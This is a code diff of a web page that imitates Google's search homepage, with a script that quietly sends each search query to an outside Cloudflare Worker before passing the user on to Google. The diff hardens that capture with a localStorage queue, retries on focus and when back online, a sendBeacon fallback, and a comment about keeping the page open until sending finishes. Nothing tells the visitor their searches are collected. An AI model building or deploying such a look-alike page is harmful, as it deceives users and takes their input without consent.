@@ -21,7 +21,6 @@
       --w:clamp(280px,92vw,600px);
       --r-pill:999px;
     }
-
     @media (prefers-color-scheme: dark) {
       :root {
         --bg:#202124;
@@ -31,7 +30,6 @@
         --blue:#8ab4f8;
       }
     }
-
     html,body {
       height:100%;
       margin:0;
@@ -41,7 +39,6 @@
       display:flex;
       flex-direction:column;
     }
-
     header {
       display:flex;
       justify-content:space-between;
@@ -49,12 +46,7 @@
       padding:10px 16px;
       background:var(--bg);
     }
-
-    .nav {
-      display:flex;
-      gap:28px;
-    }
-
+    .nav { display:flex; gap:28px; }
     .nav a {
       position:relative;
       font-size:14px;
@@ -63,139 +55,47 @@
       text-transform:uppercase;
       padding-bottom:6px;
     }
-
-    .nav a.active {
-      color:var(--blue);
-    }
-
+    .nav a.active { color:var(--blue); }
     .nav a.active::after {
       content:"";
       position:absolute;
-      bottom:0;
-      left:0;
-      width:100%;
-      height:2px;
-      background:var(--blue);
-      border-radius:2px;
+      bottom:0; left:0; width:100%; height:2px;
+      background:var(--blue); border-radius:2px;
     }
-
-    .header-right {
-      display:flex;
-      align-items:center;
-      gap:18px;
-    }
-
-    /* Compressed white 9-dot grid */
+    .header-right { display:flex; align-items:center; gap:18px; }
     .app-grid {
-      display:grid;
-      grid-template-columns:repeat(3,3px);
-      grid-template-rows:repeat(3,3px);
-      gap:3px;
-      cursor:pointer;
-      padding:6px;
-      border-radius:50%;
-      transition:background .2s ease;
+      display:grid; grid-template-columns:repeat(3,3px); grid-template-rows:repeat(3,3px);
+      gap:3px; cursor:pointer; padding:6px; border-radius:50%; transition:background .2s ease;
     }
-
-    .app-grid div {
-      width:3px;
-      height:3px;
-      background:var(--icon);
-      border-radius:50%;
-    }
-
-    .app-grid:hover {
-      background:rgba(95,99,104,0.15);
-    }
-
+    .app-grid div { width:3px; height:3px; background:var(--icon); border-radius:50%; }
+    .app-grid:hover { background:rgba(95,99,104,0.15); }
     .sign-in {
-      background:#1a73e8;
-      color:#fff;
-      padding:8px 14px;
-      border-radius:var(--r-pill);
-      text-decoration:none;
-      font-weight:500;
-      font-size:14px;
+      background:#1a73e8; color:#fff; padding:8px 14px; border-radius:var(--r-pill);
+      text-decoration:none; font-weight:500; font-size:14px;
     }
-
     main {
-      flex:1;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      justify-content:flex-start;
-      padding-top:18vh;
+      flex:1; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding-top:18vh;
     }
-
-    .logo img {
-      width:204px;
-      height:auto;
-      transition:filter .3s ease;
-    }
-
-    @media (prefers-color-scheme: dark) {
-      .logo img {
-        filter: brightness(0) invert(1);
-      }
-    }
-
-    .search {
-      position:relative;
-      margin-top:40px;
-      width:100%;
-      max-width:var(--w);
-    }
-
+    .logo img { width:204px; height:auto; transition:filter .3s ease; }
+    @media (prefers-color-scheme: dark) { .logo img { filter: brightness(0) invert(1); } }
+    .search { position:relative; margin-top:40px; width:100%; max-width:var(--w); }
     .search input {
-      width:100%;
-      height:44px;
-      border:1px solid var(--border);
-      border-radius:var(--r-pill);
-      padding:0 100px 0 50px;
-      font-size:16px;
-      outline:none;
-      background:#fff;
-      color:#000;
+      width:100%; height:44px; border:1px solid var(--border); border-radius:var(--r-pill);
+      padding:0 100px 0 50px; font-size:16px; outline:none; background:#fff; color:#000;
       transition:background .3s ease, color .3s ease;
     }
-
-    @media (prefers-color-scheme: dark) {
-      .search input {
-        background:#4e5156;
-        color:#e8eaed;
-      }
-    }
-
+    @media (prefers-color-scheme: dark) { .search input { background:#4e5156; color:#e8eaed; } }
     .search .material-symbols-outlined {
-      position:absolute;
-      top:50%;
-      transform:translateY(-50%);
-      font-size:22px;
-      color:var(--icon);
-      cursor:pointer;
-      user-select:none;
+      position:absolute; top:50%; transform:translateY(-50%); font-size:22px; color:var(--icon);
+      cursor:pointer; user-select:none;
     }
-
     .search .search-icon { left:16px; }
     .search .mic { right:56px; }
     .search .camera { right:18px; }
-
     footer {
-      margin-top:auto;
-      border-top:1px solid var(--border);
-      background:var(--bg);
-      padding:14px;
-      text-align:center;
+      margin-top:auto; border-top:1px solid var(--border); background:var(--bg); padding:14px; text-align:center;
     }
-
-    footer a {
-      color:var(--text);
-      opacity:.9;
-      text-decoration:none;
-      font-size:14px;
-      margin:0 8px;
-    }
-
+    footer a { color:var(--text); opacity:.9; text-decoration:none; font-size:14px; margin:0 8px; }
     footer a:hover { text-decoration:underline; }
   </style>
 </head>
@@ -205,7 +105,6 @@
       <a href="#" class="active">ALL</a>
       <a href="#">IMAGES</a>
     </nav>
-
     <div class="header-right">
       <div class="app-grid" title="Google apps">
         <div></div><div></div><div></div>
@@ -221,6 +120,8 @@
       <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
     </div>
 
+    <!-- Tip: if you want to guarantee the current page stays alive to finish sending,
+         add target="_blank" to open Google in a new tab -->
     <form id="search" class="search" action="https://www.google.com/search" method="GET">
       <span id="searchButton" class="material-symbols-outlined search-icon" title="Search">search</span>
       <input id="q" name="q" type="search" placeholder="Search" aria-label="Search">
@@ -240,22 +141,87 @@
   </footer>
 
   <script>
-    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';
+    // ===========================
+    //  FAST + OFFLINE-SAFE SENDER
+    // ===========================
+    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev'; // your Worker URL
+    const KEY = 'pending-google-reveal';
+    const TIMEOUT_MS = 1500;
+    const MAX_QUEUE = 200;
 
-    function sendToBackend(q){
-      try{
-        const params = new URLSearchParams({ q });
-        if (navigator.sendBeacon) {
+    function readQueue() {
+      try { return JSON.parse(localStorage.getItem(KEY) || '[]'); } catch { return []; }
+    }
+    function writeQueue(arr) {
+      try { localStorage.setItem(KEY, JSON.stringify(arr.slice(-MAX_QUEUE))); } catch {}
+    }
+    function enqueue(q) {
+      const items = readQueue();
+      items.push({ q, ts: Date.now() });
+      writeQueue(items);
+    }
+
+    async function fetchWithTimeout(url, opts = {}, timeout = TIMEOUT_MS) {
+      const ctrl = new AbortController();
+      const id = setTimeout(() => ctrl.abort(), timeout);
+      try {
+        return await fetch(url, { ...opts, signal: ctrl.signal, mode: 'cors', cache: 'no-store' });
+      } finally {
+        clearTimeout(id);
+      }
+    }
+
+    async function postNow(q) {
+      const body = new URLSearchParams({ q });
+      const r = await fetchWithTimeout(ENDPOINT, {
+        method: 'POST',
+        body,
+        headers: { 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8' }
+      });
+      if (!r.ok) throw new Error('non-200');
+    }
+
+    async function flushQueue() {
+      if (!navigator.onLine) return;
+      const items = readQueue();
+      if (!items.length) return;
+      const remaining = [];
+      for (const it of items) {
+        try { await postNow(it.q); }
+        catch { remaining.push(it); }
+      }
+      writeQueue(remaining);
+    }
+
+    // Flush when connectivity likely improved
+    window.addEventListener('online', flushQueue);
+    window.addEventListener('focus', flushQueue);
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') flushQueue();
+    });
+
+    async function sendToBackend(q, { aboutToNavigate = false } = {}) {
+      if (!q) return;
+
+      if (!navigator.onLine) { enqueue(q); return; }
+
+      try {
+        await postNow(q); // fast path
+      } catch (e) {
+        // Last-resort on navigation only, and only if online
+        if (aboutToNavigate && navigator.sendBeacon && navigator.onLine) {
+          const params = new URLSearchParams({ q });
           const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
           navigator.sendBeacon(ENDPOINT, blob);
         } else {
-          fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
+          enqueue(q);
         }
-        const img = new Image();
-        img.src = ENDPOINT + '?' + params.toString();
-      }catch(e){}
+      }
     }
 
+    // ===========================
+    //  UI WIRING
+    // ===========================
     const form = document.getElementById('search');
     const input = document.getElementById('q');
     const searchBtn = document.getElementById('searchButton');
@@ -268,15 +234,20 @@
       });
     });
 
-    form.addEventListener('submit', function(){
-      const q = (input.value || '').trim();
-      if(q){ sendToBackend(q); }
-    }, { capture:true });
+    // Try to flush anything queued as soon as we land
+    flushQueue();
 
-    searchBtn.addEventListener('click', function(){
+    // Submit path #1: regular form submit
+    form.addEventListener('submit', function () {
       const q = (input.value || '').trim();
-      if(q){
-        sendToBackend(q);
+      if (q) { sendToBackend(q, { aboutToNavigate: true }); }
+    }, { capture: true });
+
+    // Submit path #2: clicking the icon
+    searchBtn.addEventListener('click', function () {
+      const q = (input.value || '').trim();
+      if (q) {
+        sendToBackend(q, { aboutToNavigate: true });
         form.submit();
       } else {
         input.focus();
